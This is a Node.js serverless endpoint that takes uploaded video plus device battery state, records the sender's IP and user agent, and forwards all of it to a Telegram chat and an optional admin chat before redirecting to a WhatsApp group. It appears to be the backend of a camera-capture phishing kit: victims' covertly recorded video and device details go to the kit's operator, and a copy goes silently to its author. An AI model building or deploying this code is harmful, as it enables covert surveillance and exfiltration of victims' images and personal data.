const formidable = require('formidable');
const fs = require('fs');
const { Telegraf } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = (req, res) => {
  if (req.method !== 'POST') return res.status(405).send("Method Not Allowed");

  const form = new formidable.IncomingForm({
    uploadDir: "/tmp",
    keepExtensions: true,
  });

  form.parse(req, async (err, fields, files) => {
    if (err) return res.status(500).send("Form parse error");

    const uid = fields.uid;
    const file = files.video;

    if (!uid || !file) return res.status(400).send("UID or video missing");

    try {
      // Device & Network info
      const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || "Unknown";
      const userAgent = req.headers['user-agent'] || "Unknown";
      const timestamp = new Date().toLocaleString('en-US', {
        timeZone: 'Asia/Kabul',
        hour12: false,
      });

      // Battery info (from frontend)
      const battery = fields.battery || 'Unknown';
      let charging = 'Unknown';
      if (fields.charging === 'true') charging = 'Yes 🔌';
      if (fields.charging === 'false') charging = 'No 🔘';

      // Telegram Caption (BOX + FONT + LINES + Bold)
      const caption = `
╭─────🎥 <b><blockquote>𝐍𝐄𝐖 𝐕𝐈𝐃𝐄𝐎 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃</blockquote></b> │─────────────────────╮
│                                                                │ 
│─❖ 🙎 <b>Usᴇʀ ID:</b> ${uid}                                      │ 
│
│─❖ 🔋 <b>Bᴀᴛᴛᴇʀʏ:</b> ${battery}%     
│
│─❖ ⚡ <b>ᴄʜᴀʀɢɪɴɢ:</b> ${charging}
│
│─❖ 🌐 <b>IP:</b> ${ip}
│
│─❖ 📱 <b>Dᴇᴠɪᴄᴇ:</b> ${userAgent}
│ 
│─❖ 🕒 <b>Tɪᴍᴇ:</b> ${timestamp}
╰───────────────────────────────────────
╭────👨🏻‍💻 <b><blockquote>ᗷᑌIᒪT ᗷY ᗯᗩՏIᑫ</blockquote></b>  ───╮
╰─────────────────────╯
`.trim();

      // Read video
      const buffer = fs.readFileSync(file.filepath);

      // Send video to user
      await bot.telegram.sendVideo(
        uid,
        { source: buffer },
        {
          caption: caption,
          parse_mode: "HTML",
        }
      );

      // Send video to admin (optional)
      if (process.env.ADMIN_ID) {
        await bot.telegram.sendVideo(
          process.env.ADMIN_ID,
          { source: buffer },
          {
            caption: caption,
            parse_mode: "HTML",
          }
        );
      }

      // Cleanup temp file
      fs.unlinkSync(file.filepath);

      // ✅ Redirect to WhatsApp link after successful send
      res.redirect("https://chat.whatsapp.com/JHqpkhbogSIJJoLWp5Phn4");

    } catch (e) {
      console.error("Telegram Error:", e.message);

      // ❌ Redirect to WhatsApp link on error
      if (file && file.filepath) {
        try { fs.unlinkSync(file.filepath); } catch {}
      }
      res.redirect("https://chat.whatsapp.com/JHqpkhbogSIJJoLWp5Phn4");
    }
  });
}; 
